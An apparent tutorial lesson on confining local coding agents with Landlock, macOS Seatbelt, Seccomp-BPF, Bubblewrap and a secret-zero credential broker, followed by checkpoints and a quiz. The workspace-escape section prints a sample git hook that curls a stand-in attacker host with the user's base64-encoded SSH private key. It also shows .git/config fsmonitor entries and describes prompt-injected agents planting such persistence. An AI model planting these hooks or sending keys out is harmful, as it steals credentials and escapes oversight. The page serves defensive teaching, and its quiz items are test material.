---
{
  "id": "local-agent-sandboxing-seatbelt-landlock",
  "title": "Local Agent Sandboxing: Seatbelt, Landlock & Workspace Boundaries",
  "slug": "local-agent-sandboxing-seatbelt-landlock",
  "category": "LLM Agents & Tool Use",
  "difficulty": "Hard",
  "companies": ["Anthropic", "OpenAI", "Google", "GitHub", "Apple"],
  "shortDescription": "Run a coding agent on your laptop without handing it your whole user account. Learn how OS sandboxes, workspace boundaries, and secret brokering limit what it can reach.",
  "prerequisites": [
    "code-generation-agents-sandboxing",
    "guardrails-safety-filters-production",
    "git-shell-linux-reproducible-ai"
  ],
  "keyConceptsTested": [
    "Unprivileged containment (Landlock LSM, macOS Seatbelt)",
    "Syscall filtering with Seccomp-BPF",
    "Workspace jailbreaks (.git hooks, shell dotfiles, IDE tasks)",
    "Unprivileged user namespaces and Bubblewrap",
    "Secret-Zero credential broking via Unix domain sockets",
    "Defense-in-depth local agent architectures"
  ],
  "relatedQuestions": [
    "code-generation-agents-sandboxing",
    "computer-use-gui-browser-agents",
    "ai-coding-workflow-with-agents",
    "human-in-the-loop-agent-architecture",
    "prompt-injection-defense-strategies"
  ],
  "section": "Advanced Agents & Retrieval",
  "order": 9
}
---

A coding agent on your laptop reads an issue, opens local files, and runs tests to reproduce a bug. If it runs as an ordinary terminal process, it inherits your full user account: one prompt injection hidden inside a README or issue comment can read `~/.ssh/id_ed25519`, `~/.aws/credentials`, internal subnets, and shell environment tokens, or rewrite persistent dotfiles. Unlike server jobs isolated inside Docker, gVisor, or WebAssembly in [Code Generation & Sandboxing](/learn/code-generation-agents-sandboxing), a laptop runner must share the local working tree and compiler toolchain without requiring a rootful daemon.

Tools such as Claude Code, Codex CLI, and Gemini CLI solve this by splitting trust between a supervisor and a restricted worker. The supervisor holds credentials outside the sandbox and grants the worker only the paths and operations needed for the current task. On Linux, **Landlock** restricts filesystem and TCP rights, **Seccomp-BPF** filters raw system calls, and user/mount namespaces narrow process visibility. On macOS, **Seatbelt** profiles enforce per-process resource rules while repository masks protect host-side execution triggers.

<figure>
  <img src="illustrations/_generated/platform_authority_dark.png" alt="Comparison table of Linux Bubblewrap plus Landlock versus macOS Seatbelt permissions across five paths: Linux grants read-write to source code, read-only mounts to Git metadata and system directories, isolated tmpfs for scratch space, and excludes home credential directories; macOS grants whole-project writes unless explicit deny rules protect .git metadata while denying ~/.ssh and ~/.aws." />
  <figcaption>Compare writable subtrees across Linux and macOS profiles. Mount or lock down repository metadata explicitly on macOS so whole-project grants do not leave Git hooks writable.</figcaption>
</figure>


## Unprivileged containment with Linux Landlock

Linux Security Modules (LSMs) such as SELinux and AppArmor historically required root privileges to configure, whereas Linux 5.13 introduced **Landlock** as an unprivileged self-restriction subsystem.[^linuxLandlock2026] A thread can lock down itself and its future children without `sudo` prompts or daemons, while sibling threads require explicit thread synchronization flags. Because Landlock checks file permissions at open time, any descriptor opened beforehand keeps its existing rights afterward; close unneeded descriptors before untrusted execution and keep sensitive handles outside the worker.

A process configures Landlock through three kernel system calls:

1. `landlock_create_ruleset`: Declares the categories of actions to restrict (filesystem access, TCP networking, and process scoping).
2. `landlock_add_rule`: Adds grants for file hierarchies or supported network ports. An `O_PATH` descriptor identifies a filesystem object; directory rules can cover its subtree.
3. `landlock_restrict_self`: Enforces the ruleset on the calling thread. Once enforced, the restriction cannot be revoked or broadened.

Before calling `landlock_restrict_self` manually without root privileges, set `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` so setuid binaries cannot escalate past the restriction. ABI 11 also offers a flag that sets `no_new_privs` on enforcement, and ABI 8 added `LANDLOCK_RESTRICT_SELF_TSYNC` to synchronize existing threads.[^linuxLandlock2026]

### Landlock rights used in this example

Landlock adds capabilities through a versioned ABI. Query the running kernel with `landlock_create_ruleset(NULL, 0, LANDLOCK_CREATE_RULESET_VERSION)` and enable only the categories the kernel supports:

- **ABI v1 (Linux 5.13):** Core filesystem rights, including file reads/writes, execution, directory enumeration, and object creation/removal.
- **ABI v2 (Linux 5.19):** File referral and rename rights (`LANDLOCK_ACCESS_FS_REFER`).
- **ABI v3 (Linux 6.2):** File truncation rights (`LANDLOCK_ACCESS_FS_TRUNCATE`).
- **ABI v4 (Linux 6.7):** TCP network access control (`LANDLOCK_ACCESS_NET_BIND_TCP` and `LANDLOCK_ACCESS_NET_CONNECT_TCP`).
- **ABI v5 (Linux 6.10):** Device ioctl controls (`LANDLOCK_ACCESS_FS_IOCTL_DEV`).
- **ABI v6 (Linux 6.12):** Process scoping controls (`LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET` and `LANDLOCK_SCOPE_SIGNAL`) for abstract sockets and signals across the Landlock domain boundary.

The setup fragment below probes the kernel ABI (assuming ABI 3 or newer) and creates the ruleset descriptor. A complete launcher checks for probe errors, attaches per-path rules with `landlock_add_rule`, and finishes with `landlock_restrict_self`:

```c title="landlock_policy.c"
// Probe available ABI version
int abi = syscall(__NR_landlock_create_ruleset, NULL, 0, LANDLOCK_CREATE_RULESET_VERSION);

struct landlock_ruleset_attr attr = {
    .handled_access_fs = LANDLOCK_ACCESS_FS_READ_FILE |
                         LANDLOCK_ACCESS_FS_WRITE_FILE |
                         LANDLOCK_ACCESS_FS_EXECUTE |
                         LANDLOCK_ACCESS_FS_READ_DIR |
                         LANDLOCK_ACCESS_FS_TRUNCATE,
    .handled_access_net = (abi >= 4) ? (LANDLOCK_ACCESS_NET_CONNECT_TCP | LANDLOCK_ACCESS_NET_BIND_TCP) : 0,
    .scoped = (abi >= 6) ? (LANDLOCK_SCOPE_SIGNAL | LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET) : 0,
};

int ruleset_fd = syscall(__NR_landlock_create_ruleset, &attr, sizeof(attr), 0);
```

| Landlock Access Flag | Enforced Operation | Typical Local Agent Assignment |
| :--- | :--- | :--- |
| `LANDLOCK_ACCESS_FS_READ_FILE` | Open existing files for reading | Granted to system libraries, tools, and project workspace |
| `LANDLOCK_ACCESS_FS_READ_DIR` | Enumerate directory entries | Granted to system paths and project workspace |
| `LANDLOCK_ACCESS_FS_WRITE_FILE` | Write to existing files | Granted strictly to workspace `src/` and output directories |
| `LANDLOCK_ACCESS_FS_TRUNCATE` | Truncate a file | Controlled separately from writes on ABI 3 or newer |
| `LANDLOCK_ACCESS_FS_MAKE_REG` | Create regular files | Granted strictly to workspace scratch locations |
| `LANDLOCK_ACCESS_FS_EXECUTE` | Execute binary programs or scripts | Granted to `/usr`, `/bin`, and virtualenv binaries |
| `LANDLOCK_ACCESS_FS_REFER` | Link or rename across directories | Restricted to prevent moving files outside sandbox paths |
| `LANDLOCK_ACCESS_NET_CONNECT_TCP` | Connect to outbound TCP ports | Denied inside worker; outbound requests routed to supervisor |
| `LANDLOCK_SCOPE_SIGNAL` | Send signals (kill/term) to processes | Restricted to sandbox-internal process tree |

Subtree scoping fits a developer machine cleanly: granting read-write access to `/home/dev/project` leaves `/home/dev/.ssh` and `/home/dev/.bashrc` unreachable even though they share the `/home/dev` parent directory. On macOS, a different kernel mechanism enforces the same split.

```checkpoint
Why is Landlock uniquely well-suited for local coding CLI agents compared to traditional SELinux or Docker?
---
Landlock operates unprivileged. A local CLI tool can restrict its own file-system access using standard system calls without requiring root privileges, sudo prompts, or a running Docker daemon.
```

## macOS Seatbelt and Sandbox Profiles

On macOS, a CLI runner can enforce per-process rules with a custom **Seatbelt** profile, as Chromium's sandbox implementation does.[^chromiumSeatbeltImplementation2026] Apple's supported App Sandbox model targets signed apps via entitlements,[^appleSeatbelt2026] so custom CLI profiles should be verified on the target macOS release.

A C wrapper can bind workspace and home paths dynamically into a Seatbelt profile at startup rather than hardcoding user directories inside the Scheme file:

```c title="seatbelt_init.c"
#include <sandbox.h>

// Initialize Seatbelt programmatically with path parameters
const char *params[] = {
    "PROJECT_DIR", "/Users/dev/workspace",
    "TARGET_HOME_SSH", "/Users/dev/.ssh",
    "TARGET_HOME_AWS", "/Users/dev/.aws",
    "TARGET_HOME_KEYCHAIN", "/Users/dev/Library/Keychains",
    NULL
};

char *error = NULL;
if (sandbox_init_with_parameters(profile_string, 0, params, &error) != 0) {
    fprintf(stderr, "Sandbox initialization failed: %s\n", error);
    sandbox_free_error(error);
    exit(1);
}
```

The profile starts with **default deny**, then grants selected operations. Its whole-project write grant also includes `.git`; protecting that metadata requires a narrower policy.

```scheme title="agent-sandbox.sb"
;; Declare version and default-deny policy
(version 1)
(deny default)

;; Permit process execution for approved binaries
(allow process-exec
    (literal "/bin/sh")
    (literal "/bin/bash")
    (literal "/usr/bin/git")
    (literal "/usr/bin/python3")
    (subpath "/usr/bin")
    (subpath "/usr/local/bin"))

;; Allow read-only access to standard system libraries and runtimes
(allow file-read*
    (subpath "/usr")
    (subpath "/lib")
    (subpath "/System")
    (subpath "/Library/Developer"))

;; Explicitly deny sensitive developer directories
(deny file-read* file-write*
    (subpath (param "TARGET_HOME_SSH"))
    (subpath (param "TARGET_HOME_AWS"))
    (subpath (param "TARGET_HOME_KEYCHAIN")))

;; Permit read and write only within the designated project root
(allow file-read* file-write*
    (subpath (param "PROJECT_DIR")))

;; Permit standard process IPC and terminal descriptors
(allow file-read* file-write*
    (literal "/dev/null")
    (literal "/dev/zero")
    (literal "/dev/urandom")
    (literal "/dev/tty"))

;; Deny arbitrary network access
(deny network*)
```

Passing named parameters lets the supervisor bind workspace and home paths dynamically at startup rather than hardcoding them in the Scheme profile. Filesystem rules and Mach IPC service-lookup rules control independent resources, so adding `(deny mach-lookup ...)` requires testing which system services the worker actually needs. Even though this profile blocks `~/.ssh`, `~/.aws`, Keychains, and network sockets, granting write access to all of `PROJECT_DIR` still leaves repository internals exposed to host-side execution triggers.

## The workspace escape: securing repository internals

Granting writes across an entire project directory permits edits to configuration files that run later outside the sandbox under your host account. Even when `~/.ssh` and outbound networking are completely blocked, an untrusted coding agent with broad workspace writes can gain persistent host execution through repository metadata and editor settings:

### 1. The `.git/hooks/` execution trap
Git repositories store client-side lifecycle hooks such as `post-checkout`, `pre-commit`, and `post-merge` inside `.git/hooks/`.[^gitHookSecurity2026] Suppose an untrusted agent plants an executable script at `.git/hooks/post-checkout`:

```bash title="malicious_post_checkout.sh"
#!/bin/sh
curl -s http://attacker.internal/exfil?d=$(cat ~/.ssh/id_ed25519 | base64)
```

With the default hooks directory and executable bit set, a later host `git checkout main` invokes that hook after updating the worktree under your full host account.[^gitHookSecurity2026] A normal tracked-file `git diff` never shows untracked files inside `.git/hooks/`.

<figure>
  <img src="illustrations/_generated/workspace_host_trigger_dark.png" alt="Workspace persistence attack diagram showing three steps: an unmasked repository lets a worker plant .git/hooks/post-checkout, the executable file survives worker exit, and a later host git checkout runs that hook under the user's host account, contrasted with read-only masking of .git that blocks the write and leaves trusted hooks untouched." />
  <figcaption>A planted hook outlives the worker process and triggers when host Git commands run later. Mounting <code>.git</code> and IDE dotfiles read-only blocks metadata tampering, while pre-run hook inspection verifies existing scripts.</figcaption>
</figure>

### 2. The `.git/config` command execution trap
The repository configuration file `.git/config` supports command directives:

```ini title=".git/config"
[core]
    fsmonitor = /path/to/malicious/script.sh
[diff "custom"]
    command = /path/to/malicious/script.sh
```

A later host Git command that reads `core.fsmonitor` or invokes the configured external diff runs that script under your host account, after the worker sandbox has already exited.

### 3. IDE and build task configurations
Editors and developer tools also run repository configuration files under their own trust settings:
- `.vscode/tasks.json` can request a `"runOn": "folderOpen"` task, executed when workspace trust and automatic tasks allow it.
- `.idea/` and `.devcontainer/` configurations can trigger script or container launches when opened in the editor.
- `.pre-commit-config.yaml` runs through configured pre-commit hooks, and an approved `.envrc` runs when `direnv` enters the directory.

### The defense: workspace masking
A safe local sandbox enforces **workspace masking**:

1. **Isolate or mount `.git` read-only:** Separate the working tree from repository metadata. Within a single Landlock layer, rules are additive: granting writes on `/repo` still allows writes on `/repo/.git` even if you add a read-only rule on `.git`. Grant writes only to specific source subtrees, stack an independently restrictive layer, or mount `.git` read-only. Setting an environment variable alone never revokes filesystem access.
2. **Deny hidden configuration files:** Block writes to dotfiles (`.*`), especially `.git*`, `.vscode*`, `.env*`, and `.pre-commit*`.
3. **Inspect diffs before host interaction:** Confirm that candidate changes touch only intended source directories (`src/`, `tests/`) before running host Git or IDE tools against the tree.

> **Common mistake:** Adding a read-only Landlock rule on `/repo/.git` inside the same layer that grants write access to `/repo`. Grants within one Landlock layer form a union, not a subtraction, so the parent write grant wins unless you narrow the writable subtrees or mount `.git` read-only.

```checkpoint
Why is a Landlock rule granting read-write access to a git repository root directory insufficient to protect the host?
---
Writable Git metadata can plant an executable hook or configure a command. A later matching host Git operation can run it under the developer's account, after the worker has exited.
```

## Syscall filtering with Seccomp-BPF

Filesystem restrictions keep local credentials off limits, yet a confined worker can still probe sibling processes or invoke unsafe kernel interfaces directly. Linux **Seccomp-BPF** (Secure Computing with Berkeley Packet Filter) closes that path by attaching a filter program that inspects every system call number and raw argument register before kernel dispatch.[^linuxSeccompBpf2026] Pair syscall rules with mount namespaces so neither file paths nor raw OS interfaces expose unintended privileges.

Choose a syscall filter matching the worker's runtime and threat model. Common blocks include:
- `ptrace`: Prevents inspecting, pausing, or modifying memory of sibling or parent processes.
- `bpf`: Blocks loading kernel BPF bytecode or probing kernel tracing points.
- `chroot`: Blocks attempts to change the process root directory through this call.
- `keyctl`: Prevents querying kernel session keyrings.
- `socket(AF_PACKET, ...)` and `socket(AF_NETLINK, ...)`: Prevents sniffing raw network packets or altering routing tables.

**Bubblewrap** (`bwrap`) builds an unprivileged namespace and mount view that pairs cleanly with a Seccomp filter.[^bubblewrap2026][^linuxSeccompBpf2026] The command below isolates source writes from `.git` metadata; to enforce syscall filtering alongside it, pass a compiled BPF filter descriptor with `--seccomp`.

```bash title="bubblewrap-sandbox.sh"
bwrap \
  --ro-bind /usr /usr \
  --ro-bind /lib /lib \
  --ro-bind /bin /bin \
  --tmpfs /tmp \
  --proc /proc \
  --dev /dev \
  --bind /path/to/repo/src /app/src \
  --ro-bind /path/to/repo/.git /app/.git \
  --unshare-all \
  --new-session \
  --die-with-parent \
  python3 -m unittest discover /app/src
```

Key flags in this setup:
- `--ro-bind /path/to/repo/.git /app/.git`: Mounts Git metadata read-only while `/app/src` stays writable, blocking hook and config tampering at the mount layer.
- `--unshare-all`: Isolates mount, PID, IPC, and network namespaces so the worker sees only its own process tree and zero host network interfaces.
- `--die-with-parent`: Sends `SIGKILL` to the sandboxed command if the supervisor exits, preventing orphaned background workers.

## Secret-zero containment via Unix domain sockets

Agents frequently need external services such as reading CI status or fetching pull-request metadata, yet placing `GITHUB_TOKEN` in worker environment variables lets any script read `os.environ["GITHUB_TOKEN"]` and leak it to logs. In a **secret-zero** architecture, zero credentials enter the sandbox. Instead, the host broker fixes the upstream origin, accepts only allowlisted routes such as `GET /repos/owner/repo/pulls/42`, and rejects disallowed methods (`POST`, `DELETE`) or other repositories locally with `403` before network egress. Once an approved upstream reply arrives, the broker extracts only allowlisted fields such as `number` and `state`, discarding extra keys like `debug_token` before forwarding data over the Unix socket.

<figure>
  <img src="illustrations/_generated/credential_broker_dark.png" alt="Secret-zero credential broker flow across a Unix domain socket: a tokenless worker sends requests to the host broker, which allows GET on owner/repo/pulls/42, adds Bearer credentials only outbound to upstream, rejects POST or wrong repositories locally with 403, and strips unexpected reply fields such as debug_token before returning data." />
  <figcaption>The worker talks only to a local Unix socket with zero mounted API tokens. After validating method and repository scope, the host attaches credentials outbound and filters unexpected reply fields before data returns.</figcaption>
</figure>

The sandboxed process connects to a local Unix domain socket mounted into its environment. Before forwarding any request, the supervisor checks three things:
1. Is the HTTP method allowed (`GET` permitted; `DELETE` or `POST` rejected)?
2. Does the requested path match the approved repository scope?
3. Are response fields filtered to an explicit allowlist so unexpected keys never leak back into the sandbox?

Keeping authentication tokens inside the host broker closes direct environment and filesystem leaks. Fixing the upstream origin, scoping reachable repositories, and allowlisting parsed JSON fields ensures the worker receives only the minimum metadata needed to finish its task.

## Executable path-policy simulation

Before configuring kernel rules, it helps to verify how workspace path resolution handles parent traversal (`..`) and protected repository subpaths. The script below resolves five candidate paths against a temporary workspace root with `Path.resolve()` and checks each resolved path against protected targets:

<!-- leetllm: test, output=show -->
```python title="local_landlock_sandbox.py"
import tempfile
from pathlib import Path

class PathValidator:
    """Checks workspace boundaries and blocks writes to repository hooks and configs."""
    def __init__(self, workspace_root: Path):
        self.workspace_root = workspace_root.resolve()
        self.denied_subpaths = {
            self.workspace_root / ".git" / "hooks",
            self.workspace_root / ".git" / "config",
            self.workspace_root / ".vscode",
            self.workspace_root / ".env",
        }

    def can_write(self, target_path: Path) -> bool:
        resolved = target_path.resolve()
        try:
            resolved.relative_to(self.workspace_root)
        except ValueError:
            return False  # Escapes workspace root

        for denied in self.denied_subpaths:
            if resolved == denied or denied in resolved.parents:
                return False
        return True

with tempfile.TemporaryDirectory() as temp_dir:
    root = Path(temp_dir)
    src_dir = root / "src"
    git_hooks_dir = root / ".git" / "hooks"
    vscode_dir = root / ".vscode"

    src_dir.mkdir(parents=True)
    git_hooks_dir.mkdir(parents=True)
    vscode_dir.mkdir(parents=True)

    validator = PathValidator(root)

    checks = [
        ("Allowed write to src/app.py", src_dir / "app.py", True),
        ("Blocked traversal to .ssh", root / ".." / ".ssh" / "authorized_keys", False),
        ("Blocked write to .git/hooks/post-checkout", git_hooks_dir / "post-checkout", False),
        ("Blocked write to .git/config", root / ".git" / "config", False),
        ("Blocked write to .vscode/tasks.json", vscode_dir / "tasks.json", False),
    ]

    print("Path checks passed:")
    for label, target, expected in checks:
        decision = validator.can_write(target)
        assert decision is expected
        print(f" - {label}: {decision is expected}")
```

<!-- leetllm: output:start -->
```text title="Output" output compact
Path checks passed:
 - Allowed write to src/app.py: True
 - Blocked traversal to .ssh: True
 - Blocked write to .git/hooks/post-checkout: True
 - Blocked write to .git/config: True
 - Blocked write to .vscode/tasks.json: True
```
<!-- leetllm: output:end -->

> **Key insight:** A user-space path validator clarifies intended rules, but it leaves two real gaps. First, exact-target rules only match what you list: `.git` itself and sibling filenames like `.env.local` still pass `PathValidator` above. Second, a worker can swap a directory for a symlink between the check and the actual `open()` call (a TOCTOU race). That is why real containment relies on kernel enforcement (Landlock, Seatbelt, read-only mounts, and `O_NOFOLLOW`) rather than string checks alone.

<figure>
  <img src="illustrations/_generated/path_policy_tree_dark.png" alt="Resolved-path policy diagram showing sibling traversal ../.ssh/authorized_keys blocked outside the workspace root while protected paths under the root (.git/hooks, .git/config, .vscode/tasks.json) are rejected, src/app.py is permitted, and .env is configured as a protected target." />
  <figcaption><code>PathValidator</code> resolves each candidate relative to the workspace root and walks protected ancestors. Paths escaping root or matching denied targets fail, while kernel controls remain necessary against TOCTOU races.</figcaption>
</figure>

### Follow-up questions

#### How can an agent install third-party dependencies (e.g., pip packages) if network access is disabled inside the worker?

The supervisor handles dependency resolution outside the untrusted worker or proxies downloads through a local caching server. The supervisor prefetches wheels, verifies their cryptographic hashes against lockfiles, and mounts the package directory read-only into the worker environment. This keeps arbitrary unverified remote downloads out of the worker.

#### What happens if the local developer machine runs an older Linux kernel (e.g. 5.10) where Landlock is unavailable?

Probe Landlock support at startup and inspect the errno: `ENOSYS` signals an unavailable syscall, while `EOPNOTSUPP` indicates Landlock is disabled in the kernel configuration. Fall back to another isolation layer only if it enforces the same filesystem, process, and network restrictions; Seccomp alone filters syscalls without confining file hierarchies. If a required protection is unavailable, fail closed and refuse to launch the worker unsandboxed.

### What strong answers show

- Clear distinction between unprivileged OS sandboxing (Landlock, Seatbelt, Bubblewrap) and rootful container systems (Docker).
- Awareness of workspace jailbreak vectors beyond path traversal, specifically `.git/hooks`, `.git/config`, shell dotfiles, and IDE auto-execution configs.
- Knowledge of the modern Landlock ABI evolution, including network socket restrictions (ABI v4) and signal scoping (ABI v6).
- Implementation of secret-zero token brokering via host Unix domain sockets with granular request authorization.

## Check your understanding

Test these sandboxing rules on two short scenarios covering path matching and layer independence before moving to the mastery quiz.

```checkpoint
A minimal path-guard helper rejects descendants of .git/hooks and .vscode and the exact targets .git/config and .env. It otherwise allows resolved paths inside its workspace. How does it classify .env.test and .git/config.bak?

- Both pass this helper; broader environment/metadata protection needs a broader rule set.
- Both fail this helper; an exact target implicitly protects every filename with that prefix.
- .env.test fails and .git/config.bak passes; dot-env is treated as a filename prefix.
- .env.test passes and .git/config.bak fails; config is treated as a filename prefix.
---
Both pass this helper; broader environment/metadata protection needs a broader rule set.

These are distinct filenames rather than descendants of the exact targets `.env` and `.git/config`. Protecting all environment files or repository metadata requires broader rules enforced by the OS sandbox.
```

```checkpoint
A Bubblewrap command mounts Git metadata read-only, and a test metadata write fails. No seccomp filter descriptor was loaded. What evidence claim is justified?

- The write failed under the read-only mount; the same run proves a ptrace syscall deny.
- The write failed through the syscall filter; the read-only mount requires no separate check.
- The write failed through namespace naming; this proves every resource operation is contained.
- The write failed under the mounted view; syscall filtering needs its own configured filter and probes.
---
The write failed under the mounted view; syscall filtering needs its own configured filter and probes.

No seccomp program was loaded in this invocation. A denied metadata write verifies the read-only mount, not unrelated syscalls such as `ptrace`. Configure the seccomp filter and test blocked syscalls separately.
```

```mastery-quiz
[
  {
    "question": "Two Linux runners must each protect a six-byte reference file. Landlock covers ordinary writes on both but lacks the truncation right. The runners use different fallback rules. Ash’s fallback denies a direct request to set its file’s length to two bytes. Elm’s fallback denies an attempt to replace two bytes in place. Both files still contain the original six bytes. All other launch checks pass. Which runners can start?",
    "options": [
      "Start Ash and start Elm.",
      "Hold Ash and hold Elm.",
      "Start Ash and hold Elm.",
      "Hold Ash and start Elm."
    ],
    "answer": "Start Ash and hold Elm.",
    "explanation": "Ash tested shortening the file from six bytes to two, which was denied and left the file intact, verifying its truncation fallback. Elm only tested overwriting two bytes in place (an ordinary write), so Elm still lacks evidence that its fallback blocks truncation."
  },
  {
    "question": "Before applying a filesystem sandbox, a supervisor opens a secret file and accidentally passes that descriptor to the worker. The sandbox denies a fresh open of the secret path. Which assessment follows?",
    "options": [
      "The fresh-open denial does not revoke the earlier descriptor; remove sensitive inherited handles.",
      "The fresh-open denial revokes the earlier descriptor; retaining that inherited handle is sufficient.",
      "A directory change revokes the earlier descriptor; start the worker in a different working directory.",
      "The earlier descriptor retains access; hide its pathname to stop the worker from using that handle."
    ],
    "answer": "The fresh-open denial does not revoke the earlier descriptor; remove sensitive inherited handles.",
    "explanation": "Permissions attached to an opened file descriptor survive later Landlock enforcement. Hiding the pathname or denying a fresh open does not revoke an already open handle. Close sensitive descriptors (or set `O_CLOEXEC`) before spawning the worker."
  },
  {
    "question": "One Landlock layer grants writes beneath /repo. A second rule in that same layer grants only reads beneath /repo/.git. What happens to the parent-derived metadata write grant?",
    "options": [
      "Parent write disappears; the more specific child read grant replaces the parent’s write grant.",
      "Parent write remains; use narrower writable grants or an independently restrictive layer.",
      "Parent write disappears; the second matching rule turns the layer into a subtractive deny.",
      "Parent write remains; adding a third same-layer read grant removes the inherited write grant."
    ],
    "answer": "Parent write remains; use narrower writable grants or an independently restrictive layer.",
    "explanation": "Matching grants union within one layer, so the broad writable parent still grants the metadata write. Narrow the writable grant or compose a genuinely restrictive layer or read-only mount; repeating child grants cannot subtract the parent grant."
  },
  {
    "question": "A sandbox rule permits writes only below /project/src. The directory link /project/src/cache points to /vault/keys. Resolve /project/src/cache/../report under the component-wise model. Which result is correct?",
    "options": [
      "/project/src/report; allow under the source subtree.",
      "/vault/keys/report; deny outside the source subtree.",
      "/project/report; deny outside the source subtree.",
      "/vault/report; deny outside the source subtree."
    ],
    "answer": "/vault/report; deny outside the source subtree.",
    "explanation": "Follow the link first to /vault/keys, then apply `..` to reach /vault, then `report`. Lexically collapsing `cache/..` before following the link would authorize the wrong path."
  },
  {
    "question": "A worker writes an editor folder-open task and exits. Later the host opens the workspace and approves that task under its trust settings. Which lifecycle description is correct?",
    "options": [
      "The task inherits the ended worker’s restrictions because the worker authored the saved file.",
      "The task is canceled when the worker exits because its execution lifetime follows the author.",
      "The saved configuration triggers a new host-side execution under the approving tool’s privileges.",
      "The configuration becomes harmless after exit because a normal tracked diff omits that file."
    ],
    "answer": "The saved configuration triggers a new host-side execution under the approving tool’s privileges.",
    "explanation": "The file outlives its authoring process. A later approved host action starts a fresh execution context outside the ended worker's sandbox. Protect configuration files before launch and inspect workspace hooks before host interaction."
  },
  {
    "question": "A loaded seccomp filter permits openat. Filesystem rules deny the requested private-key resource. In the order syscall decision, resource decision, final operation, which result follows?",
    "options": [
      "Deny; allow; deny.",
      "Allow; deny; deny.",
      "Allow; deny; allow.",
      "Allow; allow; allow."
    ],
    "answer": "Allow; deny; deny.",
    "explanation": "Passing one layer does not bypass the other. Seccomp inspects syscall numbers and raw register arguments without resolving file paths; the filesystem sandbox still denies the open."
  },
  {
    "question": "A broker allows only GET for /repos/team/widget/pulls/7 at a host-fixed origin and returns only number and state. A worker changes that request to POST. Which result follows?",
    "options": [
      "Deny before dispatch and keep the host credential outside the worker.",
      "Dispatch POST with the host credential, then hide its reply from the worker.",
      "Rewrite POST to GET and dispatch without recording the changed request.",
      "Send the credential to the worker so it can retry the rejected request itself."
    ],
    "answer": "Deny before dispatch and keep the host credential outside the worker.",
    "explanation": "The changed method violates the allowlisted request rule, so the broker rejects it before any upstream call while keeping the credential on the host. Filtering replies cannot undo an unauthorized mutation, and silent rewriting changes the request's meaning."
  },
  {
    "question": "A Mac worker needs to edit src in a disposable repository. A trusted hook in .git prints READY when the host commits. To replace a project-wide Seatbelt write grant, a maintainer tries a source edit and a change to the hook’s message under each candidate profile, then stops the worker. Which write grant and host check would protect the hook and verify it across the handoff?",
    "options": [
      "Grant writes under src. Check that the host’s tracked diff shows just the source edit.",
      "Grant writes under src and .git. Check that a host commit still prints READY.",
      "Grant writes under src. Check that a host commit still prints READY.",
      "Grant writes under src and .git. Check that the host’s tracked diff shows just the source edit."
    ],
    "answer": "Grant writes under src. Check that a host commit still prints READY.",
    "explanation": "With writes limited to src, the source edit succeeds and the hook change fails. The host commit then runs the trusted hook and prints READY. Granting writes under .git lets the worker alter the hook, while a tracked diff omits .git entirely."
  },
  {
    "question": "A supervisor has two existing threads. Only thread A applies a self-restriction without a supported thread-synchronization flag, then launches a new child. Which coverage claim is warranted?",
    "options": [
      "Existing A and B and the future child gain the restriction because they share a process name.",
      "A and its future child inherit the restriction; existing B needs a separately supported coverage path.",
      "The future child gains the restriction; calling thread A retains its original unrestricted rights.",
      "Existing B gains the restriction; the future child runs unrestricted because it starts afterward."
    ],
    "answer": "A and its future child inherit the restriction; existing B needs a separately supported coverage path.",
    "explanation": "Self-restriction covers the calling thread and future children. Existing sibling threads need supported synchronization (`LANDLOCK_RESTRICT_SELF_TSYNC`) or another setup; sharing a process name does not propagate enforcement."
  },
  {
    "question": "A supervisor verifies a wheel’s hash against an approved lockfile and mounts the package store read-only. The wheel’s code will run during tests. Which interpretation is correct?",
    "options": [
      "The digest certifies harmless behavior; give package execution the host’s unrestricted credentials.",
      "The read-only store blocks connections from imported code, so the tests need no network restriction.",
      "The digest confines package writes to its store; allow other workspace and home writes during execution.",
      "The digest binds approved bytes; retain filesystem, credential and network restrictions during execution."
    ],
    "answer": "The digest binds approved bytes; retain filesystem, credential and network restrictions during execution.",
    "explanation": "The digest confirms that the wheel matches the lockfile bytes, not that its code is benign. Imported code still runs with the test process's permissions, so keep filesystem, credential, and network restrictions active during test execution."
  }
]
```

> **Next:** Continue to [Computer-Use / GUI / Browser Agents](/learn/computer-use-gui-browser-agents). Keep a laptop agent off your SSH keys, your git hooks, and your tokens. A shell sandbox doesn't answer the same split when the agent acts through desktop pixels and a browser.
